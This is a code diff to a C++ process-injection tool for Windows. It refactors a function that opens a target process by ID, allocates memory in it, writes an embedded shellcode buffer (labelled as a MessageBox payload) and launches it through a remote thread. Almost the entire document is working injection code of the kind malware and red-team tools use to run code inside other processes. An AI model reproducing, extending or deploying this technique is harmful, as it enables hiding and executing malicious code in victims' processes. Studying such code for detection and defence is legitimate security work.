@@ -1,6 +1,7 @@
 #include <cstdio>
 
 #include "sysapi.h"
+#include "scripts.h"
 
 // MessageBox
 char default_shellcode[] =
@@ -36,41 +37,45 @@ char default_shellcode[] =
 
 namespace scripts {
 
-bool inject_create_remote_thread(uint32_t pid) {
+bool inject_create_remote_thread(uint32_t pid, RemoteProcessMemoryMethod method) {
 
-    wprintf(L"Opening target process...\n");
-    HANDLE target_process = sysapi::ProcessOpen(pid);
-    if (target_process == NULL) {
+    wprintf(L"\nOpening the target process\n");
+    sysapi::unique_handle ProcessHandle = sysapi::ProcessOpen(pid);
+    if (ProcessHandle == NULL) {
         return false;
     }
 
-    wprintf(L"Creating section for shellcode...\n");
-    auto section = sysapi::SectionCreate(sizeof(default_shellcode));
-    if (section == NULL) {
+    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());
+
+    wprintf(L"\nPlacing shellcode in the target process\n");
+
+    RemoteProcessMemoryContext ctx;
+    ctx.method = method;
+    ctx.ProcessHandle = ProcessHandle.get();
+    ctx.Size = sizeof(default_shellcode);
+
+    bool res = process_create_memory(ctx);
+    if (!res) {
         return false;
     }
 
-    wprintf(L"Mapping section (current process)...\n");
-    auto local_addr = sysapi::SectionMapView(section, sizeof(default_shellcode), PAGE_READWRITE);
-    if (local_addr == nullptr) {
+    wprintf(L"  [*] writing shellcode...\n");
+
+    res = process_write_memory(ctx, 0, default_shellcode, sizeof(default_shellcode));
+    if (!res) {
         return false;
     }
 
-    memcpy(local_addr, default_shellcode, sizeof(default_shellcode));
-    sysapi::SectionUnmapView(local_addr);
+    wprintf(L"\nExecuting shellcode\n");
 
-    wprintf(L"Mapping section (target process)...\n");
-    auto target_addr = sysapi::SectionMapView(section, sizeof(default_shellcode), PAGE_EXECUTE_READ, target_process);
-    if (target_addr == nullptr) {
-        return false;
-    }
+    wprintf(L"  [*] starting new thread with shellcode start address...\n");
 
-    wprintf(L"Creating thread with shellcode in target process...\n");
-    auto target_thread = sysapi::ThreadCreate(target_process, target_addr);
+    sysapi::unique_handle target_thread = sysapi::ThreadCreate(ProcessHandle.get(), ctx.RemoteBaseAddress);
     if (target_thread == NULL) {
         return false;
     }
 
+    wprintf(L"\nSuccess\n");
     return true;
 }
 
